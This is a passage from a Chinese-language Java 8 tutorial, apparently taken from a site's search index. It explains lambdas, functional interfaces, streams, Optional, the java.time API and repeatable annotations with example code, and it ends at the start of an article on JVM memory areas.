\u0026#34;xenia\u0026#34;); Collections.sort(names, new Comparator\u0026lt;String\u0026gt;() { @Override public int compare(String a, String b) { return b.compareTo(a); } }); 只需要给静态方法 Collections.sort 传入一个 List 对象以及一个比较器来按指定顺序排列。通常做法都是创建一个匿名的比较器对象然后将其传递给 sort 方法。\n在Java 8 中你就没必要使用这种传统的匿名对象的方式了，Java 8提供了更简洁的语法，lambda表达式：\nCollections.sort(names, (String a, String b) -\u0026gt; { return b.compareTo(a); }); 可以看出，代码变得更短且更具有可读性，但是实际上还可以写得更短：\nCollections.sort(names, (String a, String b) -\u0026gt; b.compareTo(a)); 对于函数体只有一行代码的，你可以去掉大括号{}以及return关键字，但是你还可以写得更短点：\nnames.sort((a, b) -\u0026gt; b.compareTo(a)); List 类本身就有一个 sort 方法。并且Java编译器可以自动推导出参数类型，所以你可以不用再写一次类型。接下来我们看看lambda表达式还有什么其他用法。\n函数式接口(Functional Interfaces)    译者注： 原文对这部分解释不太清楚，故做了修改！\nJava 语言设计者们投入了大量精力来思考如何使现有的函数友好地支持Lambda。最终采取的方法是：增加函数式接口的概念。“函数式接口”是指仅仅只包含一个抽象方法,但是可以有多个非抽象方法(也就是上面提到的默认方法)的接口。 像这样的接口，可以被隐式转换为lambda表达式。java.lang.Runnable 与 java.util.concurrent.Callable 是函数式接口最典型的两个例子。Java 8增加了一种特殊的注解@FunctionalInterface,但是这个注解通常不是必须的(某些情况建议使用)，只要接口只包含一个抽象方法，虚拟机会自动判断该接口为函数式接口。一般建议在接口上使用@FunctionalInterface 注解进行声明，这样的话，编译器如果发现你标注了这个注解的接口有多于一个抽象方法的时候会报错的，如下图所示\n示例：\n@FunctionalInterface public interface Converter\u0026lt;F, T\u0026gt; { T convert(F from); } // TODO 将数字字符串转换为整数类型  Converter\u0026lt;String, Integer\u0026gt; converter = (from) -\u0026gt; Integer.valueOf(from); Integer converted = converter.convert(\u0026#34;123\u0026#34;); System.out.println(converted.getClass()); //class java.lang.Integer 译者注： 大部分函数式接口都不用我们自己写，Java8都给我们实现好了，这些接口都在java.util.function包里。\n方法和构造函数引用(Method and Constructor References)    前一节中的代码还可以通过静态方法引用来表示：\nConverter\u0026lt;String, Integer\u0026gt; converter = Integer::valueOf; Integer converted = converter.convert(\u0026#34;123\u0026#34;); System.out.println(converted.getClass()); //class java.lang.Integer Java 8允许您通过::关键字传递方法或构造函数的引用。 上面的示例显示了如何引用静态方法。 但我们也可以引用对象方法：\nclass Something { String startsWith(String s) { return String.valueOf(s.charAt(0)); } } Something something = new Something(); Converter\u0026lt;String, String\u0026gt; converter = something::startsWith; String converted = converter.convert(\u0026#34;Java\u0026#34;); System.out.println(converted); // \u0026#34;J\u0026#34; 接下来看看构造函数是如何使用::关键字来引用的，首先我们定义一个包含多个构造函数的简单类：\nclass Person { String firstName; String lastName; Person() {} Person(String firstName, String lastName) { this.firstName = firstName; this.lastName = lastName; } } 接下来我们指定一个用来创建Person对象的对象工厂接口：\ninterface PersonFactory\u0026lt;P extends Person\u0026gt; { P create(String firstName, String lastName); } 这里我们使用构造函数引用来将他们关联起来，而不是手动实现一个完整的工厂：\nPersonFactory\u0026lt;Person\u0026gt; personFactory = Person::new; Person person = personFactory.create(\u0026#34;Peter\u0026#34;, \u0026#34;Parker\u0026#34;); 我们只需要使用 Person::new 来获取Person类构造函数的引用，Java编译器会自动根据PersonFactory.create方法的参数类型来选择合适的构造函数。\nLambda 表达式作用域(Lambda Scopes)    访问局部变量    我们可以直接在 lambda 表达式中访问外部的局部变量：\nfinal int num = 1; Converter\u0026lt;Integer, String\u0026gt; stringConverter = (from) -\u0026gt; String.valueOf(from + num); stringConverter.convert(2); // 3 但是和匿名对象不同的是，这里的变量num可以不用声明为final，该代码同样正确：\nint num = 1; Converter\u0026lt;Integer, String\u0026gt; stringConverter = (from) -\u0026gt; String.valueOf(from + num); stringConverter.convert(2); // 3 不过这里的 num 必须不可被后面的代码修改（即隐性的具有final的语义），例如下面的就无法编译：\nint num = 1; Converter\u0026lt;Integer, String\u0026gt; stringConverter = (from) -\u0026gt; String.valueOf(from + num); num = 3;//在lambda表达式中试图修改num同样是不允许的。 访问字段和静态变量    与局部变量相比，我们对lambda表达式中的实例字段和静态变量都有读写访问权限。 该行为和匿名对象是一致的。\nclass Lambda4 { static int outerStaticNum; int outerNum; void testScopes() { Converter\u0026lt;Integer, String\u0026gt; stringConverter1 = (from) -\u0026gt; { outerNum = 23; return String.valueOf(from); }; Converter\u0026lt;Integer, String\u0026gt; stringConverter2 = (from) -\u0026gt; { outerStaticNum = 72; return String.valueOf(from); }; } } 访问默认接口方法    还记得第一节中的 formula 示例吗？ Formula 接口定义了一个默认方法sqrt，可以从包含匿名对象的每个 formula 实例访问该方法。 这不适用于lambda表达式。\n无法从 lambda 表达式中访问默认方法,故以下代码无法编译：\nFormula formula = (a) -\u0026gt; sqrt(a * 100); 内置函数式接口(Built-in Functional Interfaces)    JDK 1.8 API包含许多内置函数式接口。 其中一些接口在老版本的 Java 中是比较常见的比如： Comparator 或Runnable，这些接口都增加了@FunctionalInterface注解以便能用在 lambda 表达式上。\n但是 Java 8 API 同样还提供了很多全新的函数式接口来让你的编程工作更加方便，有一些接口是来自 Google Guava 库里的，即便你对这些很熟悉了，还是有必要看看这些是如何扩展到lambda上使用的。\nPredicate    Predicate 接口是只有一个参数的返回布尔类型值的 断言型 接口。该接口包含多种默认方法来将 Predicate 组合成其他复杂的逻辑（比如：与，或，非）：\n译者注： Predicate 接口源码如下\npackage java.util.function; import java.util.Objects; @FunctionalInterface public interface Predicate\u0026lt;T\u0026gt; { // 该方法是接受一个传入类型,返回一个布尔值.此方法应用于判断.  boolean test(T t); //and方法与关系型运算符\u0026#34;\u0026amp;\u0026amp;\u0026#34;相似，两边都成立才返回true  default Predicate\u0026lt;T\u0026gt; and(Predicate\u0026lt;? super T\u0026gt; other) { Objects.requireNonNull(other); return (t) -\u0026gt; test(t) \u0026amp;\u0026amp; other.test(t); } // 与关系运算符\u0026#34;!\u0026#34;相似，对判断进行取反  default Predicate\u0026lt;T\u0026gt; negate() { return (t) -\u0026gt; !test(t); } //or方法与关系型运算符\u0026#34;||\u0026#34;相似，两边只要有一个成立就返回true  default Predicate\u0026lt;T\u0026gt; or(Predicate\u0026lt;? super T\u0026gt; other) { Objects.requireNonNull(other); return (t) -\u0026gt; test(t) || other.test(t); } // 该方法接收一个Object对象,返回一个Predicate类型.此方法用于判断第一个test的方法与第二个test方法相同(equal).  static \u0026lt;T\u0026gt; Predicate\u0026lt;T\u0026gt; isEqual(Object targetRef) { return (null == targetRef) ? Objects::isNull : object -\u0026gt; targetRef.equals(object); } 示例：\nPredicate\u0026lt;String\u0026gt; predicate = (s) -\u0026gt; s.length() \u0026gt; 0; predicate.test(\u0026#34;foo\u0026#34;); // true predicate.negate().test(\u0026#34;foo\u0026#34;); // false  Predicate\u0026lt;Boolean\u0026gt; nonNull = Objects::nonNull; Predicate\u0026lt;Boolean\u0026gt; isNull = Objects::isNull; Predicate\u0026lt;String\u0026gt; isEmpty = String::isEmpty; Predicate\u0026lt;String\u0026gt; isNotEmpty = isEmpty.negate(); Function    Function 接口接受一个参数并生成结果。默认方法可用于将多个函数链接在一起（compose, andThen）：\n译者注： Function 接口源码如下\npackage java.util.function; import java.util.Objects; @FunctionalInterface public interface Function\u0026lt;T, R\u0026gt; { //将Function对象应用到输入的参数上，然后返回计算结果。  R apply(T t); //将两个Function整合，并返回一个能够执行两个Function对象功能的Function对象。  default \u0026lt;V\u0026gt; Function\u0026lt;V, R\u0026gt; compose(Function\u0026lt;? super V, ? extends T\u0026gt; before) { Objects.requireNonNull(before); return (V v) -\u0026gt; apply(before.apply(v)); } //  default \u0026lt;V\u0026gt; Function\u0026lt;T, V\u0026gt; andThen(Function\u0026lt;? super R, ? extends V\u0026gt; after) { Objects.requireNonNull(after); return (T t) -\u0026gt; after.apply(apply(t)); } static \u0026lt;T\u0026gt; Function\u0026lt;T, T\u0026gt; identity() { return t -\u0026gt; t; } } Function\u0026lt;String, Integer\u0026gt; toInteger = Integer::valueOf; Function\u0026lt;String, String\u0026gt; backToString = toInteger.andThen(String::valueOf); backToString.apply(\u0026#34;123\u0026#34;); // \u0026#34;123\u0026#34; Supplier    Supplier 接口产生给定泛型类型的结果。 与 Function 接口不同，Supplier 接口不接受参数。\nSupplier\u0026lt;Person\u0026gt; personSupplier = Person::new; personSupplier.get(); // new Person Consumer    Consumer 接口表示要对单个输入参数执行的操作。\nConsumer\u0026lt;Person\u0026gt; greeter = (p) -\u0026gt; System.out.println(\u0026#34;Hello, \u0026#34; + p.firstName); greeter.accept(new Person(\u0026#34;Luke\u0026#34;, \u0026#34;Skywalker\u0026#34;)); Comparator    Comparator 是老Java中的经典接口， Java 8在此之上添加了多种默认方法：\nComparator\u0026lt;Person\u0026gt; comparator = (p1, p2) -\u0026gt; p1.firstName.compareTo(p2.firstName); Person p1 = new Person(\u0026#34;John\u0026#34;, \u0026#34;Doe\u0026#34;); Person p2 = new Person(\u0026#34;Alice\u0026#34;, \u0026#34;Wonderland\u0026#34;); comparator.compare(p1, p2); // \u0026gt; 0 comparator.reversed().compare(p1, p2); // \u0026lt; 0 Optional    Optional不是函数式接口，而是用于防止 NullPointerException 的漂亮工具。这是下一节的一个重要概念，让我们快速了解一下Optional的工作原理。\nOptional 是一个简单的容器，其值可能是null或者不是null。在Java 8之前一般某个函数应该返回非空对象但是有时却什么也没有返回，而在Java 8中，你应该返回 Optional 而不是 null。\n译者注：示例中每个方法的作用已经添加。\n//of()：为非null的值创建一个Optional Optional\u0026lt;String\u0026gt; optional = Optional.of(\u0026#34;bam\u0026#34;); // isPresent()： 如果值存在返回true，否则返回false optional.isPresent(); // true //get()：如果Optional有值则将其返回，否则抛出NoSuchElementException optional.get(); // \u0026#34;bam\u0026#34; //orElse()：如果有值则将其返回，否则返回指定的其它值 optional.orElse(\u0026#34;fallback\u0026#34;); // \u0026#34;bam\u0026#34; //ifPresent()：如果Optional实例有值则为其调用consumer，否则不做处理 optional.ifPresent((s) -\u0026gt; System.out.println(s.charAt(0))); // \u0026#34;b\u0026#34; 推荐阅读：[Java8]如何正确使用Optional\nStreams(流)    java.util.Stream 表示能应用在一组元素上一次执行的操作序列。Stream 操作分为中间操作或者最终操作两种，最终操作返回一特定类型的计算结果，而中间操作返回Stream本身，这样你就可以将多个操作依次串起来。Stream 的创建需要指定一个数据源，比如 java.util.Collection 的子类，List 或者 Set， Map 不支持。Stream 的操作可以串行执行或者并行执行。\n首先看看Stream是怎么用，首先创建实例代码需要用到的数据List：\nList\u0026lt;String\u0026gt; stringList = new ArrayList\u0026lt;\u0026gt;(); stringList.add(\u0026#34;ddd2\u0026#34;); stringList.add(\u0026#34;aaa2\u0026#34;); stringList.add(\u0026#34;bbb1\u0026#34;); stringList.add(\u0026#34;aaa1\u0026#34;); stringList.add(\u0026#34;bbb3\u0026#34;); stringList.add(\u0026#34;ccc\u0026#34;); stringList.add(\u0026#34;bbb2\u0026#34;); stringList.add(\u0026#34;ddd1\u0026#34;); Java 8扩展了集合类，可以通过 Collection.stream() 或者 Collection.parallelStream() 来创建一个Stream。下面几节将详细解释常用的Stream操作：\nFilter(过滤)    过滤通过一个predicate接口来过滤并只保留符合条件的元素，该操作属于中间操作，所以我们可以在过滤后的结果来应用其他Stream操作（比如forEach）。forEach需要一个函数来对过滤后的元素依次执行。forEach是一个最终操作，所以我们不能在forEach之后来执行其他Stream操作。\n// 测试 Filter(过滤)  stringList .stream() .filter((s) -\u0026gt; s.startsWith(\u0026#34;a\u0026#34;)) .forEach(System.out::println);//aaa2 aaa1 forEach 是为 Lambda 而设计的，保持了最紧凑的风格。而且 Lambda 表达式本身是可以重用的，非常方便。\nSorted(排序)    排序是一个 中间操作，返回的是排序好后的 Stream。如果你不指定一个自定义的 Comparator 则会使用默认排序。\n// 测试 Sort (排序)  stringList .stream() .sorted() .filter((s) -\u0026gt; s.startsWith(\u0026#34;a\u0026#34;)) .forEach(System.out::println);// aaa1 aaa2 需要注意的是，排序只创建了一个排列好后的Stream，而不会影响原有的数据源，排序之后原数据stringList是不会被修改的：\nSystem.out.println(stringList);// ddd2, aaa2, bbb1, aaa1, bbb3, ccc, bbb2, ddd1 Map(映射)    中间操作 map 会将元素根据指定的 Function 接口来依次将元素转成另外的对象。\n下面的示例展示了将字符串转换为大写字符串。你也可以通过map来将对象转换成其他类型，map返回的Stream类型是根据你map传递进去的函数的返回值决定的。\n// 测试 Map 操作  stringList .stream() .map(String::toUpperCase) .sorted((a, b) -\u0026gt; b.compareTo(a)) .forEach(System.out::println);// \u0026#34;DDD2\u0026#34;, \u0026#34;DDD1\u0026#34;, \u0026#34;CCC\u0026#34;, \u0026#34;BBB3\u0026#34;, \u0026#34;BBB2\u0026#34;, \u0026#34;BBB1\u0026#34;, \u0026#34;AAA2\u0026#34;, \u0026#34;AAA1\u0026#34; Match(匹配)    Stream提供了多种匹配操作，允许检测指定的Predicate是否匹配整个Stream。所有的匹配操作都是 最终操作 ，并返回一个 boolean 类型的值。\n// 测试 Match (匹配)操作  boolean anyStartsWithA = stringList .stream() .anyMatch((s) -\u0026gt; s.startsWith(\u0026#34;a\u0026#34;)); System.out.println(anyStartsWithA); // true  boolean allStartsWithA = stringList .stream() .allMatch((s) -\u0026gt; s.startsWith(\u0026#34;a\u0026#34;)); System.out.println(allStartsWithA); // false  boolean noneStartsWithZ = stringList .stream() .noneMatch((s) -\u0026gt; s.startsWith(\u0026#34;z\u0026#34;)); System.out.println(noneStartsWithZ); // true Count(计数)    计数是一个 最终操作，返回Stream中元素的个数，返回值类型是 long。\n//测试 Count (计数)操作  long startsWithB = stringList .stream() .filter((s) -\u0026gt; s.startsWith(\u0026#34;b\u0026#34;)) .count(); System.out.println(startsWithB); // 3 Reduce(规约)    这是一个 最终操作 ，允许通过指定的函数来将stream中的多个元素规约为一个元素，规约后的结果是通过Optional 接口表示的：\n//测试 Reduce (规约)操作  Optional\u0026lt;String\u0026gt; reduced = stringList .stream() .sorted() .reduce((s1, s2) -\u0026gt; s1 + \u0026#34;#\u0026#34; + s2); reduced.ifPresent(System.out::println);//aaa1#aaa2#bbb1#bbb2#bbb3#ccc#ddd1#ddd2 译者注： 这个方法的主要作用是把 Stream 元素组合起来。它提供一个起始值（种子），然后依照运算规则（BinaryOperator），和前面 Stream 的第一个、第二个、第 n 个元素组合。从这个意义上说，字符串拼接、数值的 sum、min、max、average 都是特殊的 reduce。例如 Stream 的 sum 就相当于Integer sum = integers.reduce(0, (a, b) -\u0026gt; a+b);也有没有起始值的情况，这时会把 Stream 的前面两个元素组合起来，返回的是 Optional。\n// 字符串连接，concat = \u0026#34;ABCD\u0026#34; String concat = Stream.of(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;).reduce(\u0026#34;\u0026#34;, String::concat); // 求最小值，minValue = -3.0 double minValue = Stream.of(-1.5, 1.0, -3.0, -2.0).reduce(Double.MAX_VALUE, Double::min); // 求和，sumValue = 10, 有起始值 int sumValue = Stream.of(1, 2, 3, 4).reduce(0, Integer::sum); // 求和，sumValue = 10, 无起始值 sumValue = Stream.of(1, 2, 3, 4).reduce(Integer::sum).get(); // 过滤，字符串连接，concat = \u0026#34;ace\u0026#34; concat = Stream.of(\u0026#34;a\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;c\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;e\u0026#34;, \u0026#34;F\u0026#34;). filter(x -\u0026gt; x.compareTo(\u0026#34;Z\u0026#34;) \u0026gt; 0). reduce(\u0026#34;\u0026#34;, String::concat); 上面代码例如第一个示例的 reduce()，第一个参数（空白字符）即为起始值，第二个参数（String::concat）为 BinaryOperator。这类有起始值的 reduce() 都返回具体的对象。而对于第四个示例没有起始值的 reduce()，由于可能没有足够的元素，返回的是 Optional，请留意这个区别。更多内容查看： IBM：Java 8 中的 Streams API 详解\nParallel Streams(并行流)    前面提到过Stream有串行和并行两种，串行Stream上的操作是在一个线程中依次完成，而并行Stream则是在多个线程上同时执行。\n下面的例子展示了是如何通过并行Stream来提升性能：\n首先我们创建一个没有重复元素的大表：\nint max = 1000000; List\u0026lt;String\u0026gt; values = new ArrayList\u0026lt;\u0026gt;(max); for (int i = 0; i \u0026lt; max; i++) { UUID uuid = UUID.randomUUID(); values.add(uuid.toString()); } 我们分别用串行和并行两种方式对其进行排序，最后看看所用时间的对比。\nSequential Sort(串行排序)    //串行排序 long t0 = System.nanoTime(); long count = values.stream().sorted().count(); System.out.println(count); long t1 = System.nanoTime(); long millis = TimeUnit.NANOSECONDS.toMillis(t1 - t0); System.out.println(String.format(\u0026#34;sequential sort took: %d ms\u0026#34;, millis)); 1000000 sequential sort took: 709 ms//串行排序所用的时间 Parallel Sort(并行排序)    //并行排序 long t0 = System.nanoTime(); long count = values.parallelStream().sorted().count(); System.out.println(count); long t1 = System.nanoTime(); long millis = TimeUnit.NANOSECONDS.toMillis(t1 - t0); System.out.println(String.format(\u0026#34;parallel sort took: %d ms\u0026#34;, millis)); 1000000 parallel sort took: 475 ms//串行排序所用的时间 上面两个代码几乎是一样的，但是并行版的快了 50% 左右，唯一需要做的改动就是将 stream() 改为parallelStream()。\nMaps    前面提到过，Map 类型不支持 streams，不过Map提供了一些新的有用的方法来处理一些日常任务。Map接口本身没有可用的 stream()方法，但是你可以在键，值上创建专门的流或者通过 map.keySet().stream(),map.values().stream()和map.entrySet().stream()。\n此外,Maps 支持各种新的和有用的方法来执行常见任务。\nMap\u0026lt;Integer, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; 10; i++) { map.putIfAbsent(i, \u0026#34;val\u0026#34; + i); } map.forEach((id, val) -\u0026gt; System.out.println(val));//val0 val1 val2 val3 val4 val5 val6 val7 val8 val9 putIfAbsent 阻止我们在null检查时写入额外的代码;forEach接受一个 consumer 来对 map 中的每个元素操作。\n此示例显示如何使用函数在 map 上计算代码：\nmap.computeIfPresent(3, (num, val) -\u0026gt; val + num); map.get(3); // val33  map.computeIfPresent(9, (num, val) -\u0026gt; null); map.containsKey(9); // false  map.computeIfAbsent(23, num -\u0026gt; \u0026#34;val\u0026#34; + num); map.containsKey(23); // true  map.computeIfAbsent(3, num -\u0026gt; \u0026#34;bam\u0026#34;); map.get(3); // val33 接下来展示如何在Map里删除一个键值全都匹配的项：\nmap.remove(3, \u0026#34;val3\u0026#34;); map.get(3); // val33 map.remove(3, \u0026#34;val33\u0026#34;); map.get(3); // null 另外一个有用的方法：\nmap.getOrDefault(42, \u0026#34;not found\u0026#34;); // not found 对Map的元素做合并也变得很容易了：\nmap.merge(9, \u0026#34;val9\u0026#34;, (value, newValue) -\u0026gt; value.concat(newValue)); map.get(9); // val9 map.merge(9, \u0026#34;concat\u0026#34;, (value, newValue) -\u0026gt; value.concat(newValue)); map.get(9); // val9concat Merge 做的事情是如果键名不存在则插入，否则对原键对应的值做合并操作并重新插入到map中。\nDate API(日期相关API)    Java 8在 java.time 包下包含一个全新的日期和时间API。新的Date API与Joda-Time库相似，但它们不一样。以下示例涵盖了此新 API 的最重要部分。译者对这部分内容参考相关书籍做了大部分修改。\n译者注(总结)：\n  Clock 类提供了访问当前日期和时间的方法，Clock 是时区敏感的，可以用来取代 System.currentTimeMillis() 来获取当前的微秒数。某一个特定的时间点也可以使用 Instant 类来表示，Instant 类也可以用来创建旧版本的java.util.Date 对象。\n  在新API中时区使用 ZoneId 来表示。时区可以很方便的使用静态方法of来获取到。 抽象类ZoneId（在java.time包中）表示一个区域标识符。 它有一个名为getAvailableZoneIds的静态方法，它返回所有区域标识符。\n  jdk1.8中新增了 LocalDate 与 LocalDateTime等类来解决日期处理方法，同时引入了一个新的类DateTimeFormatter 来解决日期格式化问题。可以使用Instant代替 Date，LocalDateTime代替 Calendar，DateTimeFormatter 代替 SimpleDateFormat。\n  Clock    Clock 类提供了访问当前日期和时间的方法，Clock 是时区敏感的，可以用来取代 System.currentTimeMillis() 来获取当前的微秒数。某一个特定的时间点也可以使用 Instant 类来表示，Instant 类也可以用来创建旧版本的java.util.Date 对象。\nClock clock = Clock.systemDefaultZone(); long millis = clock.millis(); System.out.println(millis);//1552379579043 Instant instant = clock.instant(); System.out.println(instant); Date legacyDate = Date.from(instant); //2019-03-12T08:46:42.588Z System.out.println(legacyDate);//Tue Mar 12 16:32:59 CST 2019 Timezones(时区)    在新API中时区使用 ZoneId 来表示。时区可以很方便的使用静态方法of来获取到。 抽象类ZoneId（在java.time包中）表示一个区域标识符。 它有一个名为getAvailableZoneIds的静态方法，它返回所有区域标识符。\n//输出所有区域标识符 System.out.println(ZoneId.getAvailableZoneIds()); ZoneId zone1 = ZoneId.of(\u0026#34;Europe/Berlin\u0026#34;); ZoneId zone2 = ZoneId.of(\u0026#34;Brazil/East\u0026#34;); System.out.println(zone1.getRules());// ZoneRules[currentStandardOffset=+01:00] System.out.println(zone2.getRules());// ZoneRules[currentStandardOffset=-03:00] LocalTime(本地时间)    LocalTime 定义了一个没有时区信息的时间，例如 晚上10点或者 17:30:15。下面的例子使用前面代码创建的时区创建了两个本地时间。之后比较时间并以小时和分钟为单位计算两个时间的时间差：\nLocalTime now1 = LocalTime.now(zone1); LocalTime now2 = LocalTime.now(zone2); System.out.println(now1.isBefore(now2)); // false  long hoursBetween = ChronoUnit.HOURS.between(now1, now2); long minutesBetween = ChronoUnit.MINUTES.between(now1, now2); System.out.println(hoursBetween); // -3 System.out.println(minutesBetween); // -239 LocalTime 提供了多种工厂方法来简化对象的创建，包括解析时间字符串.\nLocalTime late = LocalTime.of(23, 59, 59); System.out.println(late); // 23:59:59 DateTimeFormatter germanFormatter = DateTimeFormatter .ofLocalizedTime(FormatStyle.SHORT) .withLocale(Locale.GERMAN); LocalTime leetTime = LocalTime.parse(\u0026#34;13:37\u0026#34;, germanFormatter); System.out.println(leetTime); // 13:37 LocalDate(本地日期)    LocalDate 表示了一个确切的日期，比如 2014-03-11。该对象值是不可变的，用起来和LocalTime基本一致。下面的例子展示了如何给Date对象加减天/月/年。另外要注意的是这些对象是不可变的，操作返回的总是一个新实例。\nLocalDate today = LocalDate.now();//获取现在的日期 System.out.println(\u0026#34;今天的日期: \u0026#34;+today);//2019-03-12 LocalDate tomorrow = today.plus(1, ChronoUnit.DAYS); System.out.println(\u0026#34;明天的日期: \u0026#34;+tomorrow);//2019-03-13 LocalDate yesterday = tomorrow.minusDays(2); System.out.println(\u0026#34;昨天的日期: \u0026#34;+yesterday);//2019-03-11 LocalDate independenceDay = LocalDate.of(2019, Month.MARCH, 12); DayOfWeek dayOfWeek = independenceDay.getDayOfWeek(); System.out.println(\u0026#34;今天是周几:\u0026#34;+dayOfWeek);//TUESDAY 从字符串解析一个 LocalDate 类型和解析 LocalTime 一样简单,下面是使用 DateTimeFormatter 解析字符串的例子：\nString str1 = \u0026#34;2014==04==12 01时06分09秒\u0026#34;; // 根据需要解析的日期、时间字符串定义解析所用的格式器  DateTimeFormatter fomatter1 = DateTimeFormatter .ofPattern(\u0026#34;yyyy==MM==dd HH时mm分ss秒\u0026#34;); LocalDateTime dt1 = LocalDateTime.parse(str1, fomatter1); System.out.println(dt1); // 输出 2014-04-12T01:06:09  String str2 = \u0026#34;2014$$$四月$$$13 20小时\u0026#34;; DateTimeFormatter fomatter2 = DateTimeFormatter .ofPattern(\u0026#34;yyy$$$MMM$$$dd HH小时\u0026#34;); LocalDateTime dt2 = LocalDateTime.parse(str2, fomatter2); System.out.println(dt2); // 输出 2014-04-13T20:00  再来看一个使用 DateTimeFormatter 格式化日期的示例\nLocalDateTime rightNow=LocalDateTime.now(); String date=DateTimeFormatter.ISO_LOCAL_DATE_TIME.format(rightNow); System.out.println(date);//2019-03-12T16:26:48.29 DateTimeFormatter formatter=DateTimeFormatter.ofPattern(\u0026#34;YYYY-MM-dd HH:mm:ss\u0026#34;); System.out.println(formatter.format(rightNow));//2019-03-12 16:26:48 🐛 修正（参见： issue#1157）：使用 YYYY 显示年份时，会显示当前时间所在周的年份，在跨年周会有问题。一般情况下都使用 yyyy，来显示准确的年份。\n跨年导致日期显示错误示例：\nLocalDateTime rightNow = LocalDateTime.of(2020, 12, 31, 12, 0, 0); String date= DateTimeFormatter.ISO_LOCAL_DATE_TIME.format(rightNow); // 2020-12-31T12:00:00 System.out.println(date); DateTimeFormatter formatterOfYYYY = DateTimeFormatter.ofPattern(\u0026#34;YYYY-MM-dd HH:mm:ss\u0026#34;); // 2021-12-31 12:00:00 System.out.println(formatterOfYYYY.format(rightNow)); DateTimeFormatter formatterOfYyyy = DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); // 2020-12-31 12:00:00 System.out.println(formatterOfYyyy.format(rightNow)); 从下图可以更清晰的看到具体的错误，并且 IDEA 已经智能地提示更倾向于使用 yyyy 而不是 YYYY 。\nLocalDateTime(本地日期时间)    LocalDateTime 同时表示了时间和日期，相当于前两节内容合并到一个对象上了。LocalDateTime 和 LocalTime还有 LocalDate 一样，都是不可变的。LocalDateTime 提供了一些能访问具体字段的方法。\nLocalDateTime sylvester = LocalDateTime.of(2014, Month.DECEMBER, 31, 23, 59, 59); DayOfWeek dayOfWeek = sylvester.getDayOfWeek(); System.out.println(dayOfWeek); // WEDNESDAY  Month month = sylvester.getMonth(); System.out.println(month); // DECEMBER  long minuteOfDay = sylvester.getLong(ChronoField.MINUTE_OF_DAY); System.out.println(minuteOfDay); // 1439 只要附加上时区信息，就可以将其转换为一个时间点Instant对象，Instant时间点对象可以很容易的转换为老式的java.util.Date。\nInstant instant = sylvester .atZone(ZoneId.systemDefault()) .toInstant(); Date legacyDate = Date.from(instant); System.out.println(legacyDate); // Wed Dec 31 23:59:59 CET 2014 格式化LocalDateTime和格式化时间和日期一样的，除了使用预定义好的格式外，我们也可以自己定义格式：\nDateTimeFormatter formatter = DateTimeFormatter .ofPattern(\u0026#34;MMM dd, yyyy - HH:mm\u0026#34;); LocalDateTime parsed = LocalDateTime.parse(\u0026#34;Nov 03, 2014 - 07:13\u0026#34;, formatter); String string = formatter.format(parsed); System.out.println(string); // Nov 03, 2014 - 07:13 和java.text.NumberFormat不一样的是新版的DateTimeFormatter是不可变的，所以它是线程安全的。 关于时间日期格式的详细信息在这里。\nAnnotations(注解)    在Java 8中支持多重注解了，先看个例子来理解一下是什么意思。 首先定义一个包装类Hints注解用来放置一组具体的Hint注解：\n@Retention(RetentionPolicy.RUNTIME) @interface Hints { Hint[] value(); } @Repeatable(Hints.class) @interface Hint { String value(); } Java 8允许我们把同一个类型的注解使用多次，只需要给该注解标注一下@Repeatable即可。\n例 1: 使用包装类当容器来存多个注解（老方法）\n@Hints({@Hint(\u0026#34;hint1\u0026#34;), @Hint(\u0026#34;hint2\u0026#34;)}) class Person {} 例 2：使用多重注解（新方法）\n@Hint(\u0026#34;hint1\u0026#34;) @Hint(\u0026#34;hint2\u0026#34;) class Person {} 第二个例子里java编译器会隐性的帮你定义好@Hints注解，了解这一点有助于你用反射来获取这些信息：\nHint hint = Person.class.getAnnotation(Hint.class); System.out.println(hint); // null Hints hints1 = Person.class.getAnnotation(Hints.class); System.out.println(hints1.value().length); // 2  Hint[] hints2 = Person.class.getAnnotationsByType(Hint.class); System.out.println(hints2.length); // 2 即便我们没有在 Person类上定义 @Hints注解，我们还是可以通过 getAnnotation(Hints.class) 来获取 @Hints注解，更加方便的方法是使用 getAnnotationsByType 可以直接获取到所有的@Hint注解。 另外Java 8的注解还增加到两种新的target上了：\n@Target({ElementType.TYPE_PARAMETER, ElementType.TYPE_USE}) @interface MyAnnotation {} Where to go from here?    关于Java 8的新特性就写到这了，肯定还有更多的特性等待发掘。JDK 1.8里还有很多很有用的东西，比如Arrays.parallelSort, StampedLock和CompletableFuture等等。\n公众号    如果大家想要实时关注我更新的文章以及分享的干货的话，可以关注我的公众号。\n《Java面试突击》: 由本文档衍生的专为面试而生的《Java面试突击》V2.0 PDF 版本公众号后台回复 \u0026ldquo;Java面试突击\u0026rdquo; 即可免费领取！\nJava工程师必备学习资源: 一些Java工程师常用学习资源公众号后台回复关键字 “1” 即可免费无套路获取。\n"},{"id":223,"href":"/java/jvm/Java%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F/","title":"Java内存区域","parent":"jvm","content":" Java 内存区域详解  写在前面 (常见面试题)  基本问题 拓展问题   一 概述 二 运行时数据区域  2.1 程序计数器 2.2 Java 虚拟机栈 2.3 本地方法栈 2.4 堆 2.5 方法区  2.5.1 方法区和永久代的关系 2.5.2 常用参数 2.5.3 为什么要将永久代 (PermGen) 替换为元空间 (MetaSpace) 呢?   2.6 运行时常量池 2.7 直接内存   三 HotSpot 虚拟机对象探秘  3.1 对象的创建  Step1:类加载检查 Step2:分配内存 Step3:初始化零值 Step4:设置对象头 Step5:执行 init 方法   3.2 对象的内存布局 3.3 对象的访问定位   四 重点补充内容  4.1 String 类和常量池 4.2 String s1 = new String(\u0026ldquo;abc\u0026rdquo;);这句话创建了几个字符串对象？ 4.3 8 种基本类型的包装类和常量池   参考 公众号    Java 内存区域详解    如果没有特殊说明，都是针对的是 HotSpot 虚拟机。\n写在前面 (常见面试题)    基本问题     介绍下 Java 内存区域（运行时数据区） Java 对象的创建过程（五步，建议能默写出来并且要知道每一步虚拟机做了什么） 对象的访问定位的两种方式（句柄和直接指针两种方式）  拓展问题     String 类和常量池 8 种基本类型的包装类和常量池  一 概述    对于 Java 程序员来说，在虚拟机自动内存管理机制下，不再需要像 C/C++程序开发程序员这样为每一个 new 操作去写对应的 delete/free 操作，不容易出现内存泄漏和内存溢出问题。正是因为 Java 